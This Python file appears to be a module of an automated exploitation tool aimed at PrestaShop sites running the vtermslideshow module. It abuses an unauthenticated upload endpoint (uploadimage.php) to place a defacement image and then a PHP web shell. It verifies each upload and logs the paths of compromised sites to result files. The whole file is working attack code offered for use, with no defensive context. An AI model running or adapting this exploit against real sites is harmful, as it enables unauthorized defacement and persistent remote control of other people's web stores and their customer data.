# coding=utf-8
import requests
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
Jce_Deface_image = 'files/pwn.gif'
ShellPresta = 'files/up.php'


def Exploit(site):
    try:
        Exp = site + '/modules/vtermslideshow/uploadimage.php'
        FileDataIndex = {'userfile': open(Jce_Deface_image, 'rb')}
        FileDataShell = {'userfile': open(ShellPresta, 'rb')}
        GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=10, headers=Headers)
        if 'success' in GoT.content:
            IndexPath = '/modules/vtermslideshow/slides/' + Jce_Deface_image.split('/')[1]
            CheckIndex = requests.get('http://' + site + IndexPath, timeout=10, headers=Headers)
            if 'GIF89a' in CheckIndex.content:
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(IndexPath + '\n')
                requests.post('http://' + Exp, files=FileDataShell, timeout=10, headers=Headers)
                ShellPath = '/modules/vtermslideshow/slides/' + ShellPresta.split('/')[1]
                CheckShell = requests.get('http://' + site + ShellPath, timeout=10, headers=Headers)
                if 'Vuln!!' in CheckShell.content:
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(ShellPath + '\n')
                return printModule.returnYes(site, 'N/A', 'vtermslideshow Module', 'Prestashop')
            else:
                return printModule.returnNo(site, 'N/A', 'vtermslideshow Module', 'Prestashop')
        else:
            return printModule.returnNo(site, 'N/A', 'vtermslideshow Module', 'Prestashop')
    except:
        return printModule.returnNo(site, 'N/A', 'vtermslideshow Module', 'Prestashop')